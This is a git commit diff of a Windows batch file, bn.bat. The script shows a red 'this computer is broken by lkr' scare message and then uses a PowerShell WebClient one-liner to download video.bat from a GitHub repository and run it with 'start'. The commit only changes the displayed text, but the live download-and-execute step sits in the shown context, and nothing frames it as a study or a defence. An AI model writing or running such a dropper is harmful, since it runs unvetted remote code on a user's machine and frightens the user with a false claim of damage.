4644dde7d46fbe056e33437f96181a0e17f00914
LKR-beta <gbu23224@gmail.com>
2024-09-01 14:54:04 +0900

    random.bat

--- bn.bat
+++ bn.bat
@@ -7,18 +7,20 @@ echo in %date%  %time%
 
 timeout /t 2 /nobreak > NUL
 
-echo this computer is
+echo this computer is broken
 
 timeout /t 3 /nobreak > NUL
 
 color 4
 
-echo broken
+echo by lkr
 
 goto hate
 
 :hate
 powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/nope/raw/main/video.bat','C:\your\asylum\video.bat')"
+
 start video.bat
+
 pause
 exit
